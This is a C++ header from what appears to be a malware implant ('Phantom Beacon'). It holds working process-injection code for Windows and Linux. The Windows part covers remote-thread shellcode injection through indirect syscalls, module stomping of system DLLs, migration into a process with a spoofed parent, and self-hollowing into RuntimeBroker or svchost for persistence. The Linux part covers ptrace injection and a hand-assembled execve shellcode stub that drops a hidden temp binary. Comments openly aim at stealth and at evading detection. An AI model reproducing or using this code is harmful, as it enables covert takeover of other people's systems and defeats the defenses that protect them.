#pragma once
// ============================================================================
//  injection.h — Phantom Beacon Process Injection (Windows + Linux)
//  ──────────────────────────────────────────────────────────────
//  Windows:  Implements Process Hollowing and Remote Thread Injection
//            using Indirect Syscalls (NtOpenProcess, NtAllocateVirtualMemory, etc.)
//  Linux:    Implements ptrace-based injection for x86_64
// ============================================================================

#include <vector>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include "syscalls.h"
#include "ppid_spoof.h"

namespace injection {

// CLIENT_ID structure for NtOpenProcess
typedef struct _CLIENT_ID_T {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_T, *PCLIENT_ID_T;

// Helper to get PID by name
inline DWORD get_process_id_by_name(const std::string& name) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (name == pe.szExeFile) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

// Remote Thread Injection via Indirect Syscalls
inline std::string inject_shellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID_T cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;

    NTSTATUS status = syscalls::SysNtOpenProcess(&hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (status != 0 || !hProcess) {
        char err[64];
        snprintf(err, sizeof(err), "NtOpenProcess failed: 0x%08lX", (unsigned long)status);
        return std::string(err);
    }

    PVOID pRemoteBuf = nullptr;
    SIZE_T size = shellcode.size();

    status = syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtAllocateVirtualMemory failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    status = syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf, (PVOID)shellcode.data(), shellcode.size(), nullptr);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtWriteVirtualMemory failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    DWORD oldProtect;
    SIZE_T protectSize = shellcode.size();
    PVOID protectAddr = pRemoteBuf;
    status = syscalls::SysNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtProtectVirtualMemory failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    HANDLE hThread = NULL;
    status = syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)(LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtCreateThreadEx failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);
    return "Successfully injected into PID " + std::to_string(pid);
}

// ── Module Stomping (PEB-walked, no IAT entries) ────────────────────────
// Overwrites the .text section of a legitimately loaded system DLL
// (kernelbase.dll or advapi32.dll) in the remote process with shellcode.
// The module list still shows the signed DLL — only its code is replaced.

/// Get module info without using kernel32!GetModuleInformation (no IAT).
/// Uses PEB walk to find the target DLL's base and parses PE headers for size.
inline bool get_module_info_peb(const char* dllName, HMODULE& hModule,
                                 SIZE_T& moduleSize) {
    // Hash the target DLL name
    std::string nameStr(dllName);
    // Lowercase for hashing
    uint32_t targetHash = 7331;
    for (char c : nameStr) {
        if (c >= 'A' && c <= 'Z') c += 32;
        targetHash = ((targetHash << 5) + targetHash) + static_cast<uint8_t>(c);
    }

    hModule = peb::GetModuleByHash(targetHash);
    if (!hModule) return false;

    // Parse PE header to get SizeOfImage
    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;

    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(hModule) + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;

    moduleSize = ntHeaders->OptionalHeader.SizeOfImage;
    return true;
}

inline bool module_stomping(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID_T cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;

    if (syscalls::SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid) != 0) return false;

    // Find a suitable DLL to stomp — use PEB walk, not GetModuleHandle
    HMODULE hTargetMod = nullptr;
    SIZE_T modSize = 0;

    // Try kernelbase.dll first, then advapi32.dll
    if (!get_module_info_peb("kernelbase.dll", hTargetMod, modSize))
        if (!get_module_info_peb("advapi32.dll", hTargetMod, modSize)) {
            syscalls::SysNtClose(hProcess);
            return false;
        }

    if (modSize < shellcode.size()) {
        syscalls::SysNtClose(hProcess);
        return false;
    }

    // Find the .text section of the target DLL
    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hTargetMod);
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(hTargetMod) + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    PVOID textSection = nullptr;
    SIZE_T textSize = 0;
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // Compare section name through XOR_STR to avoid static string
        auto nameEnc = XOR_STR(".text");
        auto nameDec = XOR_DEC(nameEnc);
        if (memcmp(sectionHeader[i].Name, nameDec.c_str(), 5) == 0) {
            textSection = reinterpret_cast<uint8_t*>(hTargetMod) +
                          sectionHeader[i].VirtualAddress;
            textSize = sectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textSection || textSize < shellcode.size()) {
        syscalls::SysNtClose(hProcess);
        return false;
    }

    // 1. Allocate memory in remote process for the shellcode
    PVOID pRemoteBuf = nullptr;
    SIZE_T size = shellcode.size();

    if (syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        syscalls::SysNtClose(hProcess);
        return false;
    }

    // 2. Write shellcode to remote buffer
    if (syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf,
            (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
        syscalls::SysNtClose(hProcess);
        return false;
    }

    // 3. Change protection to RX
    DWORD oldProtect;
    SIZE_T protectSize = shellcode.size();
    PVOID protectAddr = pRemoteBuf;
    syscalls::SysNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
        PAGE_EXECUTE_READ, &oldProtect);

    // 4. Create remote thread
    HANDLE hThread = NULL;
    syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
        hProcess, (PVOID)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL);

    // 5. Clean up handles — the thread is running, we don't need these
    if (hThread) syscalls::SysNtClose(hThread);
    syscalls::SysNtClose(hProcess);
    return true;
}

inline std::string current_process_name() {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) return "";
    std::string name(path);
    auto pos = name.find_last_of("\\/");
    if (pos != std::string::npos) name = name.substr(pos + 1);
    return name;
}

inline std::string migrate_to_new_process(const std::vector<unsigned char>& shellcode) {
    // First try PPID spoofing (explorer.exe parent) — stealthiest.
    std::string ppid_result = ppid::migrate_with_spoofed_parent(shellcode);
    if (ppid_result.find("Migrated successfully") != std::string::npos)
        return ppid_result;

    // Fallback: standard CREATE_SUSPENDED (still works but less stealthy).
    static const char* targets[] = {
        "C:\\Windows\\System32\\RuntimeBroker.exe",
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Windows\\SysWOW64\\rundll32.exe",
    };

    for (auto t : targets) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        if (!CreateProcessA(nullptr, (LPSTR)t, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
            continue;

        DWORD target_pid = pi.dwProcessId;
        std::string result = inject_shellcode(target_pid, shellcode);

        HANDLE hOriginalThread = OpenThread(THREAD_TERMINATE, FALSE, pi.dwThreadId);
        if (hOriginalThread) {
            TerminateThread(hOriginalThread, 0);
            CloseHandle(hOriginalThread);
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        if (result.find("Success") != std::string::npos)
            return "Migrated successfully to PID " + std::to_string(target_pid);
    }
    return "Failed to migrate: could not inject into a sacrificial process"
           " (PPID spoofing also failed)";
}

// ── Self-hollowing (RunKey persistence rebirth) ───────────────────────────
//
// When the on-disk persistence EXE is launched by RunKey at logon, it runs
// under its own (untrusted, easily-flagged) image name. Real process
// hollowing gives it a trusted face immediately: spawn a sacrificial
// RuntimeBroker-like process with a spoofed PPID, unmap its image, write
// our own PE there and resume. WinMain calls this before anything else;
// if it succeeds the original process exits and the beacon lives in the
// host. Runs at most once per launch.
inline bool self_hollow() {
    // A beacon already living inside a host process must not re-hollow
    // (infinite recursion: the hollowed image re-runs WinMain).
    auto name = current_process_name();
    if (name == "RuntimeBroker.exe" || name == "svchost.exe")
        return false;

    // Read our own image from disk (the RunKey-launched EXE knows where it is).
    // Direct WinAPI like persistence.h — only the remote primitives use syscalls.
    char selfPath[MAX_PATH] = {};
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return false;

    HANDLE hSelf = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) return false;

    std::vector<unsigned char> pe;
    pe.reserve(1024 * 1024);
    unsigned char chunk[65536];
    DWORD n = 0;
    while (ReadFile(hSelf, chunk, sizeof(chunk), &n, NULL) && n > 0)
        pe.insert(pe.end(), chunk, chunk + n);
    CloseHandle(hSelf);

    if (pe.size() < 0x400) return false;

    auto dos = (PIMAGE_DOS_HEADER)pe.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto nt = (PIMAGE_NT_HEADERS)(pe.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    char sysdir[MAX_PATH] = {};
    GetSystemDirectoryA(sysdir, MAX_PATH);

    const char* candidates[] = { "RuntimeBroker.exe", "svchost.exe" };
    for (const char* tgt : candidates) {
        char hostPath[MAX_PATH] = {};
        _snprintf_s(hostPath, sizeof(hostPath), _TRUNCATE, "%s\\%s", sysdir, tgt);
        if (GetFileAttributesA(hostPath) == INVALID_FILE_ATTRIBUTES) continue;

        HANDLE hHost = NULL, hT = NULL;
        DWORD hostPid = 0;
        if (!ppid::create_with_spoofed_parent(std::string(hostPath),
                hHost, hT, hostPid))
            continue;

        // Read remote PEB to find the original image base.
        PROCESS_BASIC_INFORMATION pbi = {};
        ULONG retLen = 0;
        if (syscalls::SysNtQueryInformationProcess(hHost, ProcessBasicInformation,
                &pbi, sizeof(pbi), &retLen) != 0 || !pbi.PebBaseAddress) {
            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
            continue;
        }

        PVOID oldBase = nullptr;
        if (syscalls::SysNtReadVirtualMemory(hHost,
                (PBYTE)pbi.PebBaseAddress + 0x10, &oldBase, sizeof(oldBase),
                nullptr) != 0 || !oldBase) {
            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
            continue;
        }

        syscalls::SysNtUnmapViewOfSection(hHost, oldBase);

        SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
        PVOID allocBase = nullptr;
        SIZE_T allocSize = imgSize;
        if (syscalls::SysNtAllocateVirtualMemory(hHost, &allocBase, 0, &allocSize,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
            continue;
        }

        // Patch our preferred base to the actual allocation, then copy
        // headers + every section at its virtual address.
        nt->OptionalHeader.ImageBase = (ULONGLONG)allocBase;
        syscalls::SysNtWriteVirtualMemory(hHost, allocBase, pe.data(),
            nt->OptionalHeader.SizeOfHeaders, nullptr);
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            auto& s = sec[i];
            if (s.PointerToRawData == 0 || s.SizeOfRawData == 0) continue;
            syscalls::SysNtWriteVirtualMemory(hHost,
                (PBYTE)allocBase + s.VirtualAddress,
                pe.data() + s.PointerToRawData, s.SizeOfRawData, nullptr);
        }

        // Keep the host PEB consistent with the new image base.
        PVOID newBaseVal = allocBase;
        syscalls::SysNtWriteVirtualMemory(hHost,
            (PBYTE)pbi.PebBaseAddress + 0x10, &newBaseVal, sizeof(PVOID), nullptr);

        // Relocate the entry point into Rcx and resume.
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_FULL;
        if (syscalls::SysNtGetContextThread(hT, &ctx) != 0) {
            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
            continue;
        }
        ctx.Rcx = (DWORD64)((PBYTE)allocBase + nt->OptionalHeader.AddressOfEntryPoint);
        syscalls::SysNtSetContextThread(hT, &ctx);
        syscalls::SysNtResumeThread(hT, nullptr);

        syscalls::SysNtClose(hT);
        syscalls::SysNtClose(hHost);
        return true;   // beacon now lives in the host — caller exits
    }
    return false;
}

} // namespace injection

#else
// Linux ptrace-based injection

#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <linux/elf.h>
#include <cerrno>
#include <cstring>
#include <cstdint>

namespace injection {

inline pid_t get_process_id_by_name(const std::string& name) {
    DIR* proc = opendir("/proc");
    if (!proc) return 0;
    struct dirent* entry;
    while ((entry = readdir(proc)) != nullptr) {
        bool isNum = true;
        for (char* p = entry->d_name; *p; p++) {
            if (*p < '0' || *p > '9') { isNum = false; break; }
        }
        if (!isNum) continue;
        pid_t pid = static_cast<pid_t>(std::atol(entry->d_name));
        std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
        FILE* f = fopen(commPath.c_str(), "r");
        if (!f) continue;
        char comm[256];
        if (fgets(comm, sizeof(comm), f)) {
            size_t len = strlen(comm);
            if (len > 0 && comm[len-1] == '\n') comm[len-1] = '\0';
            if (name == comm) { fclose(f); closedir(proc); return pid; }
        }
        fclose(f);
    }
    closedir(proc);
    return 0;
}

// Build execve() shellcode for x86_64 that runs a given path
// Returns shellcode bytes with path embedded
inline std::vector<unsigned char> build_execve_shellcode(const std::string& path) {
    // x86_64 execve(path, {path, NULL}, NULL) shellcode
    // This will be patched at runtime with the actual path
    std::vector<unsigned char> sc;
    
    // xor rdx, rdx        ; envp = NULL
    sc.push_back(0x48); sc.push_back(0x31); sc.push_back(0xd2);
    
    // lea rdi, [rip + offset]  ; relative address to path string
    sc.push_back(0x48); sc.push_back(0x8d); sc.push_back(0x3d);
    // offset placeholder (4 bytes) - will be patched
    size_t offset_pos = sc.size();
    sc.push_back(0x00); sc.push_back(0x00); sc.push_back(0x00); sc.push_back(0x00);
    
    // push rdx            ; NULL (argv[1])
    sc.push_back(0x52);
    // push rdi            ; path (argv[0])
    sc.push_back(0x57);
    // mov rsi, rsp        ; rsi = argv array
    sc.push_back(0x48); sc.push_back(0x89); sc.push_back(0xe6);
    
    // mov rax, 59         ; sys_execve
    sc.push_back(0x48); sc.push_back(0xc7); sc.push_back(0xc0);
    sc.push_back(0x3b); sc.push_back(0x00); sc.push_back(0x00); sc.push_back(0x00);
    
    // syscall
    sc.push_back(0x0f); sc.push_back(0x05);
    
    // Path string at the end
    size_t path_start = sc.size();
    for (char c : path) sc.push_back(static_cast<unsigned char>(c));
    sc.push_back(0x00); // null terminator
    
    // Patch the offset in lea instruction
    // offset = path_start - (offset_pos + 4)  ; RIP points after the lea instruction
    int32_t offset = static_cast<int32_t>(path_start) - static_cast<int32_t>(offset_pos + 4);
    sc[offset_pos + 0] = static_cast<unsigned char>(offset & 0xff);
    sc[offset_pos + 1] = static_cast<unsigned char>((offset >> 8) & 0xff);
    sc[offset_pos + 2] = static_cast<unsigned char>((offset >> 16) & 0xff);
    sc[offset_pos + 3] = static_cast<unsigned char>((offset >> 24) & 0xff);
    
    return sc;
}

// Write shellcode data to a file and return the path
inline std::string write_binary_to_temp(const std::vector<unsigned char>& data) {
    // Generate random path
    std::string path = "/tmp/.ph_";
    for (int i = 0; i < 8; i++) {
        static const char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        path += chars[rand() % (sizeof(chars) - 1)];
    }
    
    FILE* f = fopen(path.c_str(), "wb");
    if (!f) return "";
    size_t written = fwrite(data.data(), 1, data.size(), f);
    fclose(f);
    
    if (written != data.size()) {
        unlink(path.c_str());
        return "";
    }
    
    // Make executable
    chmod(path.c_str(), 0755);
    
    return path;
}

// Linux process injection via ptrace + /proc/pid/mem
// If shellcode starts with ELF header, writes to disk and injects execve stub
// Otherwise, injects raw shellcode directly into target memory
inline std::string inject_shellcode(pid_t pid, const std::vector<unsigned char>& shellcode) {
    // ── ELF binary handling ──────────────────────────────────────────────
    // If shellcode starts with ELF magic, write to temp file and inject execve
    if (shellcode.size() > 4 && shellcode[0] == 0x7f && 
        shellcode[1] == 'E' && shellcode[2] == 'L' && shellcode[3] == 'F') {
        
        std::string exe_path = write_binary_to_temp(shellcode);
        if (exe_path.empty()) {
            return "Failed to write ELF binary to temp file.";
        }
        
        std::vector<unsigned char> execve_sc = build_execve_shellcode(exe_path);
        
        // Inject the execve shellcode into target
        std::string result = inject_shellcode(pid, execve_sc);
        
        if (result.find("Success") != std::string::npos) {
            return "Successfully injected ELF binary into PID " + std::to_string(pid) +
                   " (execve: " + exe_path + ")";
        }
        
        unlink(exe_path.c_str());
        return result;
    }
    
    // ── Raw shellcode injection ──────────────────────────────────────────
    // 1. Attach to target process
    long ret = ptrace(PTRACE_ATTACH, pid, nullptr, nullptr);
    if (ret != 0) {
        return "ptrace attach failed: " + std::string(strerror(errno));
    }

    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Target process did not stop after attach.";
    }

    // 2. Save original registers
    struct user_regs_struct old_regs;
#ifdef __x86_64__
    if (ptrace(PTRACE_GETREGS, pid, nullptr, &old_regs) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to get registers.";
    }
#else
    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
    return "Inject not supported on this architecture.";
#endif

    // 3. Find a writable mapped region for shellcode
    std::string mapsPath = "/proc/" + std::to_string(pid) + "/maps";
    FILE* maps = fopen(mapsPath.c_str(), "r");
    if (!maps) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to read target memory maps.";
    }

    unsigned long targetAddr = 0;
    unsigned long regionSize = 0;
    char line[512];
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[8];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) >= 3) {
            if (perms[0] == 'r' && perms[1] == 'w') {
                unsigned long sz = end - start;
                if (sz >= shellcode.size()) {
                    targetAddr = start;
                    regionSize = sz;
                    break;
                }
            }
        }
    }
    fclose(maps);

    if (targetAddr == 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Could not find suitable memory region in target.";
    }

    // 4. Write shellcode using process_vm_writev
    struct iovec local_iov, remote_iov;
    local_iov.iov_base = const_cast<unsigned char*>(shellcode.data());
    local_iov.iov_len = shellcode.size();
    remote_iov.iov_base = reinterpret_cast<void*>(targetAddr);
    remote_iov.iov_len = shellcode.size();

    ssize_t written = process_vm_writev(pid, &local_iov, 1, &remote_iov, 1, 0);
    if ((size_t)written != shellcode.size()) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "process_vm_writev failed: " + std::string(strerror(errno));
    }

    // 5. Set PC to shellcode address
#if defined(__x86_64__) || defined(__i386__)
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, nullptr, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to get registers for RIP change.";
    }
#ifdef __x86_64__
    regs.rip = targetAddr;
#else
    regs.eip = targetAddr;
#endif
    if (ptrace(PTRACE_SETREGS, pid, nullptr, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to set RIP.";
    }
#elif defined(__aarch64__)
    struct iovec iov;
    struct user_pt_regs regs;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to get registers for PC change.";
    }
    regs.pc = targetAddr;
    if (ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to set PC.";
    }
#else
    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
    return "Inject not supported on this architecture.";
#endif

    // 6. Detach
    if (ptrace(PTRACE_DETACH, pid, nullptr, nullptr) != 0) {
        return "Injected but ptrace detach failed: " + std::string(strerror(errno));
    }

    return "Successfully injected into PID " + std::to_string(pid);
}

inline std::string migrate_to_new_process(const std::vector<unsigned char>& shellcode) {
    // Fork a child process and inject into it
    pid_t child = fork();
    if (child == -1) return "Failed to fork for migration.";

    if (child == 0) {
        // Child process: stop and wait for injection
        ptrace(PTRACE_TRACEME, 0, nullptr, nullptr);
        raise(SIGSTOP);
        // Child will be hijacked by parent
        // If the parent fails to inject, this will exit
        _exit(0);
    }

    // Parent: wait for child to stop
    int status;
    waitpid(child, &status, 0);

    // Inject shellcode into child
    std::string result = inject_shellcode(child, shellcode);

    if (result.find("Success") != std::string::npos) {
        // Detach was already done by inject_shellcode
        return "Migrated successfully to PID " + std::to_string(child);
    }

    // Clean up child
    kill(child, SIGKILL);
    waitpid(child, &status, 0);
    return "Migration failed: " + result;
}

inline std::string current_process_name() {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len <= 0) return "unknown";
    path[len] = '\0';
    std::string name(path);
    auto pos = name.find_last_of('/');
    if (pos != std::string::npos) name = name.substr(pos + 1);
    return name;
}

inline bool self_hollow() { return false; }

} // namespace injection

#endif
